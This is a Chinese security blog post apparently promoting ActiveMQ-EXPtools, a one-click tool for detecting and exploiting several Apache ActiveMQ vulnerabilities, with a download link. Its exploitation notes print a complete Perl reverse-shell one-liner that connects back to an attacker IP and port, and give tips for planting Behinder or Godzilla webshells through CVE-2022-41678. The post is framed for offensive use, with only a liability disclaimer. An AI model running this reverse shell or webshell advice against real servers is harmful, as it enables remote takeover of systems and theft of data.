#  ActiveMQ-EXPtools | Apache ActiveMQ全系列漏洞一键支持检测和利用工具  
Catherines77
                    Catherines77  李白你好   2026-04-21 00:01  
  
**免责声明：**  
由于传播、利用本公众号李白你好所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号李白你好及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
  
## 工具介绍  
  
**ActiveMQ-EXPtools**  
支持检测和利用Apache ActiveMQ漏洞，CVE-2015-5254，CVE-2016-3088，CVE-2022-41678，CVE-2023-46604，CVE-2024-32114，CVE-2026-34197。作者：Catherines77  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ft6csZH0gNWMms4KnQ7mBXT0bzJdCpArgDgZjCrjnVMynZge96KibVmhWRLrdicJgCUenl7To59Ow5lGSJfyqqZoiapqd3yxibthicXGicJK9qCfI/640?wx_fmt=png&from=appmsg "")  
## 漏洞利用说明  
### CVE-2015-5254  
  
java-chains生成反序列化数据，验证漏洞时可以用URLDNS  
  
在反弹shell时最好用perl，sh和bash有时弹不了  
```
/usr/bin/perl -e 'use Socket;$i="192.168.239.129";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ft6csZH0gNUGvBZdNPDI77PtlWePwPyw8shmwU8Z3zfgN0q4kSKibtzibwBia8y8Qt63THZj4VrcSxPb09yyCB1HkNUykkEHKnkbCnDHxziazYA/640?wx_fmt=png&from=appmsg "")  
### CVE-2022-41678  
  
自定义webshell写入时，冰蝎马写入会报500，哥斯拉正常。工具连接时注意要加上认证头部  
  
**参考致谢**  
  
https://github.com/URJACK2025/CVE-2022-41678  
  
https://github.com/vulhub/vulhub  
  
https://github.com/vulhub/java-chains  
## 工具下载  
```
https://github.com/Catherines77/ActiveMQ-EXPtools/releases/tag/1.0
```  
## 网络安全情报攻防站  
  
**www.libaisec.com**  
  
综合性的技术交流与资源共享社区  
  
专注于红蓝对抗、攻防渗透、威胁情报、数据泄露  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ft6csZH0gNXlMXOiaQnDnib8Yw2ZMMF18DHWnyB6Kn2SUWEPSnbEdAX6OuicmLwtbFJTBmeqiaB1moy9vD5rqYHoOmkgicqmB42IAJ66DbZ70AoU/640?wx_fmt=jpeg&from=appmsg "")  
  
  
